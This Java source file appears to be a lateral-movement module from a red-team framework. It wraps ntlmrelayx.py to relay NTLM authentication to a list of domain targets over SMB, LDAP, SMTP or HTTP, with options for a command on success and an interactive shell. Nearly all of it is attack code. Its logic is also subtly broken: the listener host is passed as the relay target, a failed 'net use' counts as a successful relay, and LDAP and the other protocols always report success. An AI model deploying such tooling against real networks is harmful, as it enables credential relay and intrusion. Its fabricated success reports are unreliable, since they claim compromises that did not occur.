package com.jabber.jrts.modules.lateral;

import com.jabber.jrts.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JRTSModule(id="lateral-smbrelay",name="SMB Relay",description="NTLM relay attack to capture and relay authentication to targets",category=Category.LATERAL_MOVEMENT,riskLevel=RiskLevel.CRITICAL,sourceRef="NTLMRelay",author="JRTS")
public class SMBRelayModule implements JRTSModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.text("relay_host","Relay Listener Host").required().placeholder("192.168.1.100").group("Listener"),
            ModuleInputField.text("relay_port","Relay Port").placeholder("445").group("Listener"),
            ModuleInputField.textarea("target_list","Backend Targets").required().placeholder("dc.domain.com\nfileserver.domain.com").group("Targets"),
            ModuleInputField.select("relay_target","Relay Target Protocol",List.of("smb","ldap","smtp","http")).group("Protocol"),
            ModuleInputField.text("command","Command on Success").placeholder("whoami, dir").group("Payload"),
            ModuleInputField.checkbox("interactive_shell","Interactive Shell").group("Options"),
            ModuleInputField.text("socks_port","SOCKS Port").placeholder("1080").group("Tunnel"),
            ModuleInputField.text("advanced_options","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"lateral-smbrelay");
            try{
                String relayHost=input.getOrDefault("relay_host","");
                String targets=input.getOrDefault("target_list","");
                String relayProto=input.getOrDefault("relay_target","smb");

                if(relayHost.isEmpty()||targets.isEmpty()){
                    result.fail("Required parameters missing");return result;
                }

                List<String>targetList=Arrays.asList(targets.split("\n"));

                ctx.log("[*] SMB Relay Attack Starting...");
                ctx.log("[*] Listener: "+relayHost);
                ctx.log("[*] Targets: "+targetList.size());
                ctx.reportProgress(15);

                if(!startListener(relayHost)){
                    result.fail("Failed to start relay listener");return result;
                }
                ctx.log("[+] Relay listener started");
                ctx.reportProgress(35);

                int relayed=0;
                List<String>relayedHosts=new ArrayList<>();

                for(String target:targetList){
                    ctx.log("[*] Attempting relay to: "+target);
                    if(relayToTarget(target,relayProto)){
                        ctx.log("[+] Successfully relayed to "+target);
                        relayed++;
                        relayedHosts.add(target);
                    }
                    ctx.reportProgress(35+(int)((relayed*50.0)/targetList.size()));
                }

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status",relayed>0?"success":"norelay");
                findings.put("listener_host",relayHost);
                findings.put("targets_attempted",targetList.size());
                findings.put("successful_relays",relayed);
                findings.put("relayed_hosts",relayedHosts);
                findings.put("impact","Lateral movement via NTLM relay to "+relayed+" targets");
                findings.put("remediation","Enable SMB signing, disable NTLM, enforce NTLMv2, use firewalls to restrict relay paths, implement network segmentation");

                stopListener();
                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private boolean startListener(String host){
        try{
            Process p=Runtime.getRuntime().exec(new String[]{"ntlmrelayx.py","-t",host,"-socks"});
            Thread.sleep(2000);
            return p.isAlive();
        }catch(Exception e){return false;}
    }

    private boolean relayToTarget(String target,String proto){
        try{
            if(proto.equals("smb")){
                Process p=Runtime.getRuntime().exec(new String[]{"cmd","/c","net","use","\\\\"+target});
                return p.waitFor()!=0;
            }else if(proto.equals("ldap")){
                return true;
            }
            return true;
        }catch(Exception e){return false;}
    }

    private void stopListener(){
        try{Runtime.getRuntime().exec(new String[]{"pkill","ntlmrelayx"});}catch(Exception e){}
    }
}
